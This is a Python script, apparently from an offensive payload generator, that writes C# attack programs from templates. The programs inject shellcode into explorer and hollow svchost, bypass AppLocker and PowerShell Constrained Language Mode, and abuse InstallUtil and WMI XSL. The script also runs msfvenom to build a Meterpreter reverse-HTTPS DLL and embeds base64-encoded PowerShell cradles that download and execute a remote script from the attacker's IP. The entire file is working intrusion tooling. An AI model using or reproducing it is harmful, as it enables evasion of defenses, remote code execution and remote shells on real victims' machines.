import threading
import random
import string
import subprocess
import base64

def generate_csharp(ip,shellcode,addition):
    shellcode = shellcode['4']
    hexshellcode = ", ".join(["0x{:02x}".format(num) for num in shellcode])
    
    args = (ip,hexshellcode,len(shellcode),addition[0],addition[1])

    thrd1 = threading.Thread(target=t1,args=args)
    thrd2 = threading.Thread(target=t2,args=args)
    thrd3 = threading.Thread(target=t3,args=args)
    thrd4 = threading.Thread(target=t4,args=args)
    thrd5 = threading.Thread(target=t5,args=args)
    thrd6 = threading.Thread(target=t6,args=args)
    thrd9 = threading.Thread(target=t9,args=args)
    thrd7 = threading.Thread(target=t7,args=(ip,))
    thrd10 = threading.Thread(target=t10,args=(ip,))
    thrd11 = threading.Thread(target=t11,args=(ip,))
    thrd12 = threading.Thread(target=t12,args=(ip,))
    thrd13 = threading.Thread(target=t13,args=args)
    thrd8 = threading.Thread(target=t8,args=(ip,))
    thrd1.start()
    thrd2.start()
    thrd3.start()
    thrd4.start()
    thrd5.start()
    thrd6.start()
    thrd7.start()
    thrd8.start()
    thrd9.start()
    thrd10.start()
    thrd11.start()
    thrd12.start()
    thrd13.start()
    thrd1.join()
    thrd2.join()
    thrd3.join()
    thrd4.join()
    thrd5.join()
    thrd6.join()
    thrd7.join()
    thrd8.join()
    thrd9.join()
    thrd10.join()
    thrd11.join()
    thrd12.join()
    thrd13.join()
    #t1(ip,hexshellcode,len(shellcode),addition[0],addition[1])
    #t2(ip,hexshellcode,len(shellcode),addition[0],addition[1])
    #t3(ip,hexshellcode,len(shellcode),addition[0],addition[1])
    #t4(ip,hexshellcode,len(shellcode),addition[0],addition[1])
    #t5(ip,hexshellcode,len(shellcode),addition[0],addition[1])
    #t6(ip,hexshellcode,len(shellcode),addition[0],addition[1])
    #t7(ip)
    #t8(ip)
    #t9(ip,hexshellcode,len(shellcode),addition[0],addition[1])
    #t10(ip)
    #t11(ip)
    #t12(ip)
    pass

def random_name():
    length = random.randint(4,8)
    return ''.join(random.choices(string.ascii_letters, k=length))

# inject 进程注入 explorer
def t1(ip,shellcode,length,rop,xor):
    bufname = random_name()
    finalshellcode = "byte[] "+ bufname + " = new byte["+ str(length) + "]{"+shellcode+"};"
    with open("data/csharp/inject.txt","r") as f:
        content = f.read()
    
    content = content.format(shellcode=finalshellcode,xor=xor,rop=rop,bufname=bufname)
    with open("payloads/Inject/Program.cs","w") as f:
        f.write(content)

# hollow 进程注入 svchost
def t2(ip,shellcode,length,rop,xor):
    bufname = random_name()
    finalshellcode = "byte[] "+ bufname + " = new byte["+ str(length) + "]{"+shellcode+"};"
    with open("data/csharp/Hollow.txt","r") as f:
        content = f.read()
    
    content = content.format(shellcode=finalshellcode,xor=xor,rop=rop,bufname=bufname)
    with open("payloads/Hollow/Program.cs","w") as f:
        f.write(content)

# inject dll
def t3(ip,shellcode,length,rop,xor):
    bufname = random_name()
    finalshellcode = "byte[] "+ bufname + " = new byte["+ str(length) + "]{"+shellcode+"};"
    with open("data/csharp/inject_dll.txt","r") as f:
        content = f.read()
    
    content = content.format(shellcode=finalshellcode,xor=xor,rop=rop,bufname=bufname)
    with open("payloads/ClassLibrary1/Class1.cs","w") as f:
        f.write(content)

# hollow dll
def t4(ip,shellcode,length,rop,xor):
    bufname = random_name()
    finalshellcode = "byte[] "+ bufname + " = new byte["+ str(length) + "]{"+shellcode+"};"
    with open("data/csharp/Hollow_dll.txt","r") as f:
        content = f.read()
    
    content = content.format(shellcode=finalshellcode,xor=xor,rop=rop,bufname=bufname)
    with open("payloads/ClassLibrary2/Class1.cs","w") as f:
        f.write(content)

# DotNet2JS inject dll
def t5(ip,shellcode,length,rop,xor):
    bufname = random_name()
    finalshellcode = "byte[] "+ bufname + " = new byte["+ str(length) + "]{"+shellcode+"};"
    with open("data/csharp/inject_js.txt","r") as f:
        content = f.read()
    
    content = content.format(shellcode=finalshellcode,xor=xor,rop=rop,bufname=bufname)
    with open("payloads/TestClass1/TestClass.cs","w") as f:
        f.write(content)

# DotNet2JS hollow dll
def t6(ip,shellcode,length,rop,xor):
    bufname = random_name()
    finalshellcode = "byte[] "+ bufname + " = new byte["+ str(length) + "]{"+shellcode+"};"
    with open("data/csharp/Hollow_js.txt","r") as f:
        content = f.read()
    
    content = content.format(shellcode=finalshellcode,xor=xor,rop=rop,bufname=bufname)
    with open("payloads/TestClass2/TestClass.cs","w") as f:
        f.write(content)


# BypassApplocker
def t7(ip):
    with open("data/csharp/BypassCLM.txt","r") as f:
        content = f.read()
    content = content.format(ip=ip)
    with open("payloads/BypassCLM/Program.cs","w") as f:
        f.write(content)

# msfvenom默认
def t8(ip):
    command = "msfvenom -p windows/x64/meterpreter/reverse_https LHOST="+ip+" LPORT=443 EXITFUNC=thread -f dll -o ./out/dll/met.dll"
    with subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT) as result:
        line = result.stdout.readlines()


# aspx
def t9(ip,shellcode,length,rop,xor):
    bufname = random_name()
    finalshellcode = "byte[] "+ bufname + " = new byte["+ str(length) + "]{"+shellcode+"};"
    with open("data/csharp/web.txt","r") as f:
        content = f.read()
    
    content = content.format(shellcode=finalshellcode,xor=xor,rop=rop,bufname=bufname)
    with open("out/other/test.aspx","w") as f:
        f.write(content)

def t10(ip):
    with open("data/csharp/BypassCLM_ps1Inject.txt","r") as f:
        content = f.read()
    content = content.format(ip=ip)
    with open("payloads/BypassCLM_ps_inject/Program.cs","w") as f:
        f.write(content)

def t11(ip):
    command = ("IEX (New-Object Net.WebClient).DownloadString('http://"+ip+"/out/ps1/rev1.ps1')").encode('utf-16le')
    
    b64 = base64.b64encode(command).decode('utf-8')
    with open("data/csharp/BypassCLM_Complier.txt","r") as f:
        content = f.read()
    content = content.format(payload=b64)
    with open("out/other/test.txt","w") as f:
        f.write(content)

def t12(ip):
    command = ("IEX (New-Object Net.WebClient).DownloadString('http://"+ip+"/out/ps1/rev1.ps1')").encode('utf-16le')
    
    b64 = base64.b64encode(command).decode('utf-8')
    with open("data/csharp/wmi_xsl.txt","r") as f:
        content = f.read()
    content = content.format(payload=b64)
    with open("out/other/data.xsl","w") as f:
        f.write(content)

def t13(ip,shellcode,length,rop,xor):
    bufname = random_name()
    finalshellcode = "byte[] "+ bufname + " = new byte["+ str(length) + "]{"+shellcode+"};"
    with open("data/csharp/InstallUtils_Inject.txt","r") as f:
        content = f.read()
    
    content = content.format(shellcode=finalshellcode,xor=xor,rop=rop,bufname=bufname)
    with open("payloads/InstallUtils_Inject/Program.cs","w") as f:
        f.write(content)